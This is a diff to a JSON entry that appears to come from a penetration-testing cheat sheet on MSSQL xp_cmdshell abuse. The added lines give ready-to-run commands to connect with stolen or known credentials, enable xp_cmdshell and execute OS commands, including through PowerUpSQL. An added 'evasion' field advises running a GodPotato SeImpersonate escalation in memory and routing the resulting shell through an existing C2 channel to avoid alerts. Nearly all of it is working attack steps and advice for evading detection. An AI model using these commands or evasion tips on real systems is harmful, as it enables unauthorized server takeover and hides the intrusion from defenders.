@@ -96,6 +96,35 @@
       "HTB M26",
       "MITRE T1505.001",
       "MITRE T1078"
-    ]
-  }
+    ],
+    "evasion": "Pick the potato that matches the OS (GodPotato for 2019/2022) to avoid crashes and alerts; run it in-memory; the SeImpersonate abuse itself is quiet — the noisy part is the spawned shell, so route it through an existing C2 channel."
+  },
+  "variations": [
+    {
+      "label": "Enable + run in one query",
+      "command": "EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;"
+    },
+    {
+      "label": "Run an OS command",
+      "command": "EXEC xp_cmdshell 'whoami'"
+    },
+    {
+      "label": "PowerUpSQL",
+      "command": "Invoke-SQLOSCmd -Instance <instance> -Command 'whoami' -RawResults"
+    }
+  ],
+  "steps": [
+    {
+      "label": "Connect (Windows or SQL auth)",
+      "command": "mssqlclient.py <domain>/<user>:<password>@<ip> -windows-auth"
+    },
+    {
+      "label": "Enable xp_cmdshell",
+      "command": "enable_xp_cmdshell"
+    },
+    {
+      "label": "Execute OS commands",
+      "command": "xp_cmdshell whoami /priv"
+    }
+  ]
 }
